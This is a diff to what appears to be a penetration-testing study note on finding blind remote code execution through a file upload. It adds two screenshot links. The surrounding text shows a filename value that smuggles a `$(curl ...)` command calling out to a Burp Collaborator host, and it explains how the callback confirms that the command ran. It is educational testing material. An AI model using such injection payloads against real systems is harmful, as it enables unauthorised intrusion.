@@ -30,11 +30,12 @@ From previous tests, we can see that nothing is really working. It's not giving 
 In this case, ==we have to test for a blind RCE.== I know we haven't covered this previously in our slides. It's almost the same as an RCE; we just have to find a different way to see the output of a command.
 
 This could be done in several ways. The first thing we can try is sending a cURL request. We can say, "Hey, I want you to make a cURL command,"   `( filename="test123 $(curl Burp-collaborator-payload-link ).png)`
-
+![[Screenshot From 2025-03-11 17-02-29.png]]
 and use a Burp Collaborator link. We copy the link and tell it to send the request to our Burp Collaborator, hoping that this command gets executed.
 
 
 We send this out and hope for a hit. We poll for responses and see that we are getting a request sent to our Burp Collaborator. It comes from a user agent with cURL, which indicates that our command has executed.
+![[Screenshot From 2025-03-11 17-03-23.png]]
 
 To confirm, we can extract content from the website. One way to do this is by adding a subdomain in Burp Collaborator. We'll type in "test123" to confirm that the request is actually coming from the web server we're attacking and not some random IP on the internet.
 
